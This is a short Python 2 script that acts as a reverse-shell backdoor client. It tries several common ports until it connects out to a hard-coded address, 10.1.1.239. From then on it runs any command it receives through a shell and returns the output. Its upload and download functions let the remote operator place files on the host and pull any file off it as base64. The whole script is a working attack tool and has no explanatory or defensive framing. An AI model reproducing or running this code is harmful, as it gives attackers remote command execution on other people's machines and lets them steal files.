import socket
import time
import subprocess


def upload(mysocket):
    mysocket.send("What is the name of the file you are uploading?:")
    fname = mysocket.recv(1024)
    mysocket.send("What unique string will end the transmission?:")
    endoffile = mysocket.recv(1024)
    mysocket.send(
        "Transmit the file as a base64 encoded string followed by the end of transmission string.")
    data = ""
    while not data.endswith(endoffile):
        data += mysocket.recv(1024)
    try:
        fh = open(fname.strip(), "w")
        fh.write(data[:-len(endoffile)].decode("base64"))
        fh.close()
    except:
        mysocket.send("Unable to create file " + fname)
    else:
        mysocket.send(fname + " successfully uploaded")


def download(mysocket):
    mysocket.send("What file do you want (including path)?:")
    fname = mysocket.recv(1024)
    mysocket.send(
        "Receive a base64 encoded string containing your file will end with !EOF!")
    try:
        data = open(fname.strip()).read().encode("base64")
    except:
        data = "File " + fname + " not found"
    mysocket.sendall(data + "!EOF!")


def ScanAndConnect():
    print "it started"
    connected = False
    while not connected:
        for port in [21, 22, 80, 443, 8000]:
            time.sleep(1)
            try:
                print "Trying", port,

                mysocket.connect(("10.1.1.239", port))
            except socket.error:
                print "Nope"
                continue
            else:
                print "Connected"
                connected = True
                break

mysocket = socket.socket()
ScanAndConnect()
while True:
    try:
        commandrequested = mysocket.recv(1024)
        if len(commandrequested) == 0:
            time.sleep(3)
            mysocket = socket.socket()
            ScanAndConnect()
            continue
        if commandrequested[:4] == "QUIT":
            mysocket.send("Terminating Connection.")
            break
        if commandrequested[:6] == "UPLOAD":
            upload(mysocket)
            continue
        if commandrequested[:8] == "DOWNLOAD":
            download(mysocket)
            continue
        prochandle = subprocess.Popen(
            commandrequested,  shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        prochandle.wait()
        results = prochandle.stdout.read() + prochandle.stderr.read()
        mysocket.send(results)
    except socket.error:
        break
    except Exception as e:
        mysocket.send(str(e))
        break
